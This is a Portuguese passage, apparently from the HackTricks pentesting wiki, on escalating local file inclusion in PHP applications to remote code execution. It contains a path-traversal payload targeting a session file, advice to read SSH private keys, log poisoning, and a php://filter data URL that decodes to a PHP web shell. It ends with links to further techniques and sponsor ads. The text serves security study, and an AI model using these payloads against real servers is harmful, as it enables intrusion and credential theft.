Para proteger seu aplicativo da web contra ataques de inclus√£o de arquivo local (LFI), siga estas pr√°ticas recomendadas:

- Valide e filtre cuidadosamente todos os dados de entrada, especialmente os par√¢metros de URL.
- Restrinja o acesso aos diret√≥rios e arquivos sens√≠veis.
- Utilize mecanismos de controle de acesso para limitar as permiss√µes de leitura e grava√ß√£o.
- Mantenha seu aplicativo e seus componentes atualizados com as √∫ltimas corre√ß√µes de seguran√ßa.

Ao implementar essas medidas de prote√ß√£o, voc√™ pode reduzir significativamente o risco de um ataque de inclus√£o de arquivo local (LFI) bem-sucedido.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual usu√°rio est√° sendo usado (/proc/self/status e /etc/passwd) e tente acessar **\<HOME>/.ssh/id\_rsa**

### **Via** **logs do vsftpd**

Os logs deste servidor FTP s√£o armazenados em _**/var/log/vsftpd.log**_. Se voc√™ tiver um LFI e puder acessar um servidor vsftpd exposto, voc√™ pode tentar fazer login definindo o payload PHP no nome de usu√°rio e, em seguida, acessar os logs usando o LFI.

### Via filtro php base64 (usando base64)

Conforme mostrado neste [artigo](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64), o filtro base64 do PHP simplesmente ignora o que n√£o √© base64. Voc√™ pode usar isso para contornar a verifica√ß√£o da extens√£o do arquivo: se voc√™ fornecer base64 que termina com ".php", ele simplesmente ignorar√° o "." e adicionar√° "php" ao base64. Aqui est√° um exemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Atrav√©s de filtros php (sem necessidade de arquivo)

Este [**artigo**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que voc√™ pode usar **filtros php para gerar conte√∫do arbitr√°rio** como sa√≠da. O que basicamente significa que voc√™ pode **gerar c√≥digo php arbitr√°rio** para a inclus√£o **sem precisar escrev√™-lo** em um arquivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Atrav√©s de falha de segmenta√ß√£o

**Fa√ßa upload** de um arquivo que ser√° armazenado como **tempor√°rio** em `/tmp`, ent√£o na **mesma requisi√ß√£o**, provoque uma **falha de segmenta√ß√£o**, e ent√£o o **arquivo tempor√°rio n√£o ser√° exclu√≠do** e voc√™ pode procur√°-lo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Atrav√©s do armazenamento de arquivos tempor√°rios do Nginx

Se voc√™ encontrou uma **Inclus√£o Local de Arquivos** e o **Nginx** est√° sendo executado na frente do PHP, voc√™ pode ser capaz de obter RCE com a seguinte t√©cnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Atrav√©s do PHP\_SESSION\_UPLOAD\_PROGRESS

Se voc√™ encontrou uma **Inclus√£o Local de Arquivos**, mesmo que voc√™ **n√£o tenha uma sess√£o** e `session.auto_start` esteja `Off`. Se voc√™ fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** nos dados **multipart POST**, o PHP ir√° **habilitar a sess√£o para voc√™**. Voc√™ pode abusar disso para obter RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Atrav√©s do upload de arquivos tempor√°rios no Windows

Se voc√™ encontrou uma **Inclus√£o Local de Arquivos** e o servidor est√° sendo executado no **Windows**, voc√™ pode obter RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Atrav√©s do phpinfo() (file\_uploads = on)

Se voc√™ encontrou uma **Inclus√£o Local de Arquivos** e um arquivo expondo **phpinfo()** com file\_uploads = on, voc√™ pode obter RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Atrav√©s de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulga√ß√£o de Caminho

Se voc√™ encontrou uma **Inclus√£o Local de Arquivos** e voc√™ **pode extrair o caminho** do arquivo tempor√°rio, MAS o **servidor** est√° **verificando** se o **arquivo a ser inclu√≠do tem marcas PHP**, voc√™ pode tentar **burlar essa verifica√ß√£o** com essa **Condi√ß√£o de Corrida**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Atrav√©s de espera eterna + for√ßa bruta

Se voc√™ pode abusar da LFI para **fazer upload de arquivos tempor√°rios** e fazer o servidor **ficar pendurado** na execu√ß√£o do PHP, voc√™ pode ent√£o **for√ßar nomes de arquivos por horas** para encontrar o arquivo tempor√°rio:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Para Erro Fatal

Se voc√™ incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Voc√™ precisa incluir o mesmo duas vezes para gerar esse erro).

**Eu n√£o sei como isso √© √∫til, mas pode ser.**\
_Mesmo que voc√™ cause um Erro Fatal do PHP, os arquivos tempor√°rios do PHP enviados s√£o exclu√≠dos._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Refer√™ncias

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
